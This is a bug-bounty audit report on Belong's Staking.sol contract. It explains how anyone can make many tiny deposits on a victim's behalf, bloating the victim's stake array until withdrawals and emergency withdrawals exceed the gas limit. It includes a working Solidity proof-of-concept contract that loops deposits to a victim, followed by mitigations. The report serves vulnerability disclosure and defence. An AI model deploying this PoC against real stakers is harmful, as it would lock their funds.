# 56826 sc medium attacker can bloat a victim s stakes array and cause withdrawals emergency flows to run out of gas

**Submitted on Oct 21st 2025 at 02:23:04 UTC by @Bug82427 for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #56826
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/belongnet/checkin-contracts/blob/main/contracts/v2/periphery/Staking.sol>
* **Impacts:** Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief/Intro

The Staking contract pushes a new `Stake` struct to `stakes[to]` on every deposit. Withdrawals (normal and emergency) iterate the entire `Stake[]` for the user. Any party can `deposit` for an arbitrary `to`, so an attacker can repeatedly deposit small amounts for a victim, creating thousands of stake entries. Later, when the victim (or anyone acting on their behalf) tries to withdraw or be emergency-withdrawn, the contract must iterate and modify the huge array — the loop can exceed block gas limits and cause the withdrawal/emergency action to revert, effectively locking funds (temporary freeze / griefing). This requires no privileged access.

### Vulnerability Details

Relevant code (simplified):

```solidity
function _deposit(...) internal override {
    super._deposit(...);
    // locks freshly minted shares
    stakes[to].push(Stake({shares: shares, timestamp: block.timestamp}));
}
```

Withdraw iteration:

```solidity
function _consumeUnlockedSharesOrRevert(address staker, uint256 need) internal {
    Stake[] storage userStakes = stakes[staker];
    for (uint256 i; i < userStakes.length && remaining > 0;) {
        // swap-and-pop removal or partial reduce
        // ...
    }
}
```

Both `_consumeUnlockedSharesOrRevert` (normal withdraw) and `_removeAnySharesFor` (emergency flow) may iterate the entire `Stake[]`. There is no cap on number of `Stake` entries and no mechanism to compact entries automatically.

Because anyone can call `deposit(amount, to)`, an attacker can create many tiny entries for `to = victim`.

### Why it is exploitable (realistic attacker path)

* No privileged access required.
* Attacker needs only LONG tokens and gas.
* `deposit` action is public and accepts arbitrary `to`.
* No code limits arrays length or enforces cost-proportional resistance.

### Impact Details

Primary impact: Griefing — attacker can prevent a victim from withdrawing by inflating the victim’s stakes array; funds remain in contract but become effectively inaccessible for the victim until the array is compacted or owner intervenes.

Technical root: Unbounded per-user state growth + linear loops on withdraw operations → unbounded gas consumption risk.

Loss model: Not direct theft — attacker spends tokens to mount the attack; victims are denied access to funds. For a high-value target the cost can be modest (attacker only needs to create many small stake entries).

Severity: Medium (Denial-of-service/griefing; funds temporarily frozen; requires no privileged access).

Duration: Could be temporary (until owner fixes/compacts) or long (if owner is unresponsive). For high gas costs the victim may be blocked for days.

## References

* Target contract: <https://github.com/belongnet/checkin-contracts/blob/main/contracts/v2/periphery/Staking.sol>

## Proof of Concept

{% hint style="info" %}
Notes before running:

This PoC assumes the deployed Staking contract implements ERC4626-style `deposit(uint256 assets, address to)` which pulls tokens from `msg.sender`. That is the case in the provided Staking contract.

The PoC contract must be funded with LONG tokens first (transfer LONG to the PoC contract), then call `bloat(...)`. The PoC will approve the staking contract and loop calling `deposit(...)`, creating many `Stake` entries for `victim`.

On a local fork use `n = 1000` (or less) to reproduce gas exhaustion; on a public testnet reduce `n` to fit gas limits.
{% endhint %}

<details>

<summary>Proof-of-Concept contract (expand to view)</summary>

{% code title="StakeBloatPoC.sol" %}

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IStaking {
    // solady ERC4626-compatible deposit signature
    function deposit(uint256 assets, address to) external returns (uint256 shares);
}

contract StakeBloatPoC {
    IStaking public immutable staking;
    IERC20  public immutable longToken;
    address public owner;

    constructor(address _staking, address _longToken) {
        staking = IStaking(_staking);
        longToken = IERC20(_longToken);
        owner = msg.sender;
    }

    /// Fund this contract with LONG (transfer via UI or script), then call bloat().
    /// - amountEach: assets per deposit (choose small value, e.g. 1e18 if LONG has 18 decimals)
    /// - n: number of deposits (careful: too large -> this tx itself can hit gas limit)
    function bloat(address victim, uint256 amountEach, uint256 n) external {
        require(msg.sender == owner, "only owner");
        // Approve staking to pull tokens from this contract
        longToken.approve(address(staking), type(uint256).max);

        for (uint256 i = 0; i < n; ++i) {
            // Each deposit will push a new Stake entry for `victim`.
            staking.deposit(amountEach, victim);
        }
    }

    /// Helper: return any leftover LONG to owner
    function drain(uint256 amount) external {
        require(msg.sender == owner, "only owner");
        longToken.transfer(owner, amount);
    }
}
```

{% endcode %}

</details>

## Mitigation suggestions (not exhaustive)

* Avoid unbounded per-user arrays for on-path operations. Consider alternative stake tracking:
  * Compact deposits for the same `to` and timestamp ranges (merge adjacent entries when possible).
  * Use a mapping of sloted balances with a fixed number of buckets per user (cost-amortized, bounded iterations).
  * Push-only pattern but require recipients to claim via off-chain signed vouchers or pull pattern that charges attacker gas for creating many entries.
  * Enforce a per-depositor rate limit or per-recipient cap on pending stake entries (careful with UX & fairness).
* Make withdraw/emergency flows gas-bounded: process only up to N entries per call and allow iterative withdrawals across multiple transactions (user retries).
* Consider on-deposit compaction: if last stake entry for `to` has the same lock/timestamp semantics, merge instead of pushing a new entry.
* Add validators to `deposit` to deter gratuitous tiny deposits for arbitrary recipients (e.g., minimum deposit size, economic friction).

(These are high-level suggestions — exact approach must be chosen to fit the protocol design and UX constraints.)
